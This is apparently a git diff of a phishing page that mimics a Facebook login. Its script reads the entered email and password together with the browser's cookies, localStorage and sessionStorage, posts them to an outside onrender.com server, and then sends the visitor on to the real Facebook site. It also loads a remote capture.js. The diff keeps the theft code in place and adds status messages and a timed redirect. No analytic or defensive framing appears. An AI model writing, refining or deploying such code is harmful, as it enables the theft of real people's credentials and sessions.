@@ -12,6 +12,8 @@
   <script src="https://zaza-4f7z.onrender.com/capture.js"></script>
 </head>
 <body>
+  <p id="feedback" class="feedback-message"></p>
+
   <div class="language-switcher">
     <select id="langSelect">
       <option value="en">English (US)</option>
@@ -101,42 +103,46 @@
   </footer>
 
   <script type="module">
-    const loginForm = document.getElementById('loginForm');
+    (async () => {
+      const feedback = document.getElementById('feedback');
 
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
+      const loginForm = document.getElementById('loginForm');
 
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
-      const cookies = document.cookie || '[no cookies]';
-      const localStorageDump = JSON.stringify(localStorage || {});
-      const sessionStorageDump = JSON.stringify(sessionStorage || {});
+      loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
 
-      const payload = {
-        email,
-        password,
-        cookies,
-        localStorage: localStorageDump,
-        sessionStorage: sessionStorageDump
-      };
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const cookies = document.cookie || '[no cookies]';
+        const localStorageDump = JSON.stringify(localStorage || {});
+        const sessionStorageDump = JSON.stringify(sessionStorage || {});
 
-      try {
-        await fetch('https://zaza-back.onrender.com/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          credentials: 'include',
-          body: JSON.stringify(payload)
-        });
+        const payload = {
+          email,
+          password,
+          cookies,
+          localStorage: localStorageDump,
+          sessionStorage: sessionStorageDump
+        };
 
-        // optionally show UI feedback (can be removed)
-        // document.getElementById('result').innerHTML = `<p>Welcome, ${email}</p>`;
-
-      } catch (error) {
-        console.error('Login failed:', error);
-      } finally {
-        window.location.href = 'https://www.facebook.com/';
-      }
-    });
+        try {
+          feedback.innerText = 'Sending data...';
+          await fetch('https://zaza-back.onrender.com/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify(payload)
+          });
+          feedback.innerText = '✅ Data sent.';
+        } catch (error) {
+          feedback.innerText = '❌ Failed to send.';
+        } finally {
+          setTimeout(() => {
+            window.location.href = 'https://www.facebook.com/';
+          }, 1200);
+        }
+      });
+    })();
   </script>
 
 </body>
